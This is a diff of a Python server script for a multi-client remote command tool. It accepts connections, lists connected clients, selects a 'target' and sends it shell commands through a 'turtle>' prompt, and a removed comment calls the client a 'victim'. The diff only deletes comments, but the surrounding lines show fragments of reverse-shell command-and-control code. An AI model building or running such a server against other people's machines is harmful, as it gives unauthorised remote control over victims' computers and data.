@@ -42,9 +42,6 @@ def bind_socket():
         bind_socket()
 
 
-# Handling connection from multiple clients and saving to a list
-# Closing previous connections when server.py file is restarted
-
 def accepting_connections():
     for c in all_connections:
         c.close()
@@ -66,16 +63,6 @@ def accepting_connections():
             print("Error accepting connections")
 
 
-# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
-# Interactive prompt for sending commands
-# turtle> list
-# 0 Friend-A Port
-# 1 Friend-B Port
-# 2 Friend-C Port
-# turtle> select 1
-# 192.168.0.112> dir
-
-
 def start_turtle():
 
     while True:
@@ -90,8 +77,6 @@ def start_turtle():
         else:
             print("Command not recognized")
 
-
-# Display all current active connections with client
 
 def list_connections():
     results = ''
@@ -109,8 +94,6 @@ def list_connections():
 
     print("----Clients----" + "\n" + results)
 
-
-# Selecting the target
 def get_target(cmd):
     try:
         target = cmd.replace('select ', '')  # target = id
@@ -125,8 +108,6 @@ def get_target(cmd):
         print("Selection not valid")
         return None
 
-
-# Send commands to client/victim or a friend
 def send_target_commands(conn):
     while True:
         try:
@@ -141,8 +122,6 @@ def send_target_commands(conn):
             print("Error sending commands")
             break
 
-
-# Create worker threads
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work)
